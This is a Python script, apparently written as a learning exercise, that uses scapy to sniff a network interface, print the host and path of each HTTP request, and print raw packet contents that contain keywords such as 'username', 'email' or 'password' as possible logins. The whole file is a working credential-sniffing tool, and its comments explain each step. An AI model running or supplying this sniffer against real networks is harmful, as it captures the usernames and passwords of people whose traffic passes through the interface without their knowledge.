#!/usr/bin/env python
import scapy.all as scapy
from scapy.layers import http
import optparse


def parsing():
    parser = optparse.OptionParser()
    parser.add_option("-i", "--interface", dest="interface", help="The sniffed Interface")
    (options, arguments) = parser.parse_args()
    if not options.interface:
        parser.error("[-] Please specify the interface using -i option.")
    return options


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)  # not to store any packets on the computer to not cause much load on it | prn is a call function when any packet is sniffed by this line, means that each packet will be captured will call another function specified by the prn argument


def get_login(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ["username", "login", "email", "password", "Password"]  # if you found any of these keywords in the Raw packet show its content, this is done because programmer may not use the word username and use email instead of it
        for keyword in keywords:
            if keyword.encode() in load:  # i used .encode() because in python3 it will prompt an error: "TypeError: a bytes-like object is required, not 'str'" so we have to encode it from str to bytes in order to compare it with the load packet
                return load


def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path  # we can get the names of the fields in the packet type by printing its packet.show() and fin the argument that has the values that we want to access



def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):  # if my packet has that layer(HTTP layer) print that packet to me
        url = get_url(packet)
        print("[+] HTTP Request >> {0}".format(url.decode()))
        login_info = get_login(packet)
        if login_info:
            print("\n\n[+] Possible Username / Password >> {0}\n\n".format(login_info.decode()))


options = parsing()
sniff(options.interface)
